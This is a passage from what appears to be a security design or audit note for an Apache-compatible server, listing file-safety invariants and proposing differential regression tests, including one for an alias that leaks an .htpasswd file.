  `O_EXCL`/`create_new`, a private mode, and an unpredictable or
  collision-checked name; no shared-temp symlink can redirect a write.
* **I42 `expr_file_test_confined`:** expression file tests use the same
  canonical document-root confinement as `file()`/`filesize()`.

A useful regression shape for future passes is to run the Apache differential
against the repository's own fixture tree, not only against hand-written
configs: `tests/adversarial_regressions.py` currently contains the
capture-only alias that leaks its own `.htpasswd`, and a single-file `Alias` is
not represented in either the conformance or feature benchmark matrices.
